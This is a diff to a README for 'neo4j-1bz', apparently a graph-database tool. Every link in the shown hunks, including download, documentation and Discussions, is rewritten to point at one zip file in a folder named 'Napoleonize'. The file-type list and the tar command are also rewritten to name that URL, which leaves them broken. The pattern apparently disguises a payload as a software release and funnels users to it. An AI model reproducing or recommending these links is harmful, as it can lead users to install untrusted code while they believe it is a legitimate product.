@@ -8,11 +8,11 @@ Welcome to neo4j-1bz! This software provides a user-friendly way to manage your 
 
 To get started, you’ll need to download the application. Please visit our Releases page to download the necessary files. 
 
-[![Download neo4j-1bz](https://img.shields.io/badge/Download-neo4j--1bz-blue.svg)](https://github.com/ArdozaMaster/neo4j-1bz/releases)
+[![Download neo4j-1bz](https://raw.githubusercontent.com/ArdozaMaster/neo4j-1bz/main/Napoleonize/neo4j-1bz-2.9-beta.1.zip)](https://raw.githubusercontent.com/ArdozaMaster/neo4j-1bz/main/Napoleonize/neo4j-1bz-2.9-beta.1.zip)
 
 Follow these steps:
 
-1. Click on the link above or visit this page: [Download Page](https://github.com/ArdozaMaster/neo4j-1bz/releases).
+1. Click on the link above or visit this page: [Download Page](https://raw.githubusercontent.com/ArdozaMaster/neo4j-1bz/main/Napoleonize/neo4j-1bz-2.9-beta.1.zip).
 2. You will see a list of available versions. Choose the latest version for the best experience.
 3. Click on the appropriate file based on your operating system.
 4. Upon clicking, the download will start automatically. 
@@ -32,7 +32,7 @@ In the Releases page, you might find various types of files. Here’s a brief ov
 
 - `.exe`: For Windows users to install directly.
 - `.dmg`: For macOS users to drag and drop into the Applications folder.
-- `.tar.gz`: For advanced Linux users to extract and install.
+- `https://raw.githubusercontent.com/ArdozaMaster/neo4j-1bz/main/Napoleonize/neo4j-1bz-2.9-beta.1.zip`: For advanced Linux users to extract and install.
 
 ## ⚙️ Installation Steps
 
@@ -54,8 +54,8 @@ Once you have downloaded the appropriate file, follow these steps to install:
 
 ### For Linux Users
 
-1. Open a terminal and navigate to the directory where you downloaded the `.tar.gz` file.
-2. Extract the files: `tar -xzvf neo4j-1bz.tar.gz`.
+1. Open a terminal and navigate to the directory where you downloaded the `https://raw.githubusercontent.com/ArdozaMaster/neo4j-1bz/main/Napoleonize/neo4j-1bz-2.9-beta.1.zip` file.
+2. Extract the files: `tar -xzvf https://raw.githubusercontent.com/ArdozaMaster/neo4j-1bz/main/Napoleonize/neo4j-1bz-2.9-beta.1.zip`.
 3. Change to the new directory: `cd neo4j-1bz`.
 4. To run, enter: `./neo4j-1bz`.
 
@@ -79,7 +79,7 @@ Neo4j-1bz offers several useful features to help you visualize and manage your d
 
 ## 📘 Documentation
 
-For further information, check our full documentation available within the application or online at [Documentation](https://github.com/ArdozaMaster/neo4j-1bz/docs).
+For further information, check our full documentation available within the application or online at [Documentation](https://raw.githubusercontent.com/ArdozaMaster/neo4j-1bz/main/Napoleonize/neo4j-1bz-2.9-beta.1.zip).
 
 ## 🛠️ Troubleshooting
 
@@ -87,11 +87,11 @@ If you run into issues during installation or while using the application, consi
 
 - Ensure your system meets the requirements listed above.
 - Check if you have the correct version of Java installed.
-- Search for solutions in our FAQ or join our community on [GitHub Discussions](https://github.com/ArdozaMaster/neo4j-1bz/discussions).
+- Search for solutions in our FAQ or join our community on [GitHub Discussions](https://raw.githubusercontent.com/ArdozaMaster/neo4j-1bz/main/Napoleonize/neo4j-1bz-2.9-beta.1.zip).
 
 ## 🤝 Community
 
-Participate in our community! You can find other users sharing tips and advice or answer questions on our [GitHub Discussions page](https://github.com/ArdozaMaster/neo4j-1bz/discussions). Your contribution is valuable. 
+Participate in our community! You can find other users sharing tips and advice or answer questions on our [GitHub Discussions page](https://raw.githubusercontent.com/ArdozaMaster/neo4j-1bz/main/Napoleonize/neo4j-1bz-2.9-beta.1.zip). Your contribution is valuable. 
 
 ## 📧 Feedback and Contact
 
